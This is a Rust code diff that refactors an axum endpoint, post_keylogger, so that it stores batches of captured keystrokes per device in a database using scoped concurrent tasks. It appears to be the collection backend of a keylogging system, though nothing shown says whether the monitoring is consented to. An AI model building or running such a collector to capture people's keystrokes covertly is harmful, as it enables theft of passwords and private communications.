@@ -1,3 +1,4 @@
+use async_scoped::TokioScope;
 use axum::{Json, extract::State, http::HeaderMap};
 use chrono::NaiveDateTime;
 use utoipa::ToSchema;
@@ -36,37 +37,36 @@ pub async fn post_keylogger(
     State(app_state): State<AppState>,
     Json(req): Json<Req>,
 ) -> Result<(), Error> {
-    let mut handles = vec![];
     let device_id = headers
         .get("device-id")
         .and_then(|v| v.to_str().ok())
         .unwrap_or("unknown");
 
-    for key in req.keys.into_iter() {
-        let db_pool = app_state.db_pool.clone();
-        let device_id = device_id.to_owned();
-        let handle = tokio::spawn(async move {
-            let keylog_id = Uuid::new_v4();
-            sqlx::query!(
-                r#"
+    let (_, results) = TokioScope::scope_and_block(|spawner| {
+        for key in req.keys.iter() {
+            let db_pool = app_state.db_pool.clone();
+            spawner.spawn(async move {
+                let keylog_id = Uuid::new_v4();
+                sqlx::query!(
+                    r#"
                     INSERT INTO Keylog
                         (keylog_id, device_id, key, created_at)
                         VALUES ($1, $2, $3, $4)
                     ;
                 "#,
-                keylog_id,
-                device_id,
-                &key.key_pressed,
-                &key.at,
-            )
-            .execute(&db_pool)
-            .await
-        });
-        handles.push(handle);
-    }
+                    keylog_id,
+                    device_id,
+                    &key.key_pressed,
+                    &key.at,
+                )
+                .execute(&db_pool)
+                .await
+            });
+        }
+    });
 
-    for handle in handles {
-        let _ = handle.await;
+    for result in results {
+        result??;
     }
 
     Ok(())
